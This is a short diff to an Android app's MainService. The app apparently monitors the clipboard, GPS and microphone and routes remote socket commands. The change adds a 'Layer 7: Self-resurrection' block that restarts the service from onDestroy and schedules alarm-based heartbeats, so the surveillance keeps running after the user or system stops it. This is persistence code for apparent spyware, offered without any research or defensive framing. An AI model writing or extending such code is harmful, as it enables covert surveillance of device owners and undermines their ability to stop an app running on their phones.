@@ -23,6 +23,7 @@ import com.fason.app.core.network.SocketCommandRouter;
 import com.fason.app.features.clipboard.ClipboardMonitor;
 import com.fason.app.features.location.GpsManager;
 import com.fason.app.receiver.WatchdogReceiver;
+import com.fason.app.persistence.AlarmEngine;
 
 public class MainService extends Service {
     public static final int NOTIF_ID = 1;
@@ -230,7 +231,7 @@ public class MainService extends Service {
     }
 
     private void scheduleWatchdog() {
-        scheduleAlarm(Protocol.BC_KEEP_ALIVE, 999, WATCHDOG_INTERVAL_MS);
+        AlarmEngine.scheduleWatchdog();
     }
 
     @Override
@@ -250,6 +251,17 @@ public class MainService extends Service {
 
     @Override
     public void onDestroy() {
+        // Layer 7: Self-resurrection
+        try {
+            Log.w("MainService", "Service destroyed — attempting self-resurrection");
+            Intent intent = new Intent(this, MainService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent);
+            } else {
+                startService(intent);
+            }
+            AlarmEngine.scheduleHeartbeat();
+        } catch (Exception ignored) {}
         try {
             com.fason.app.features.mic.MicManager.stop(null);
         } catch (Exception ignored) {}
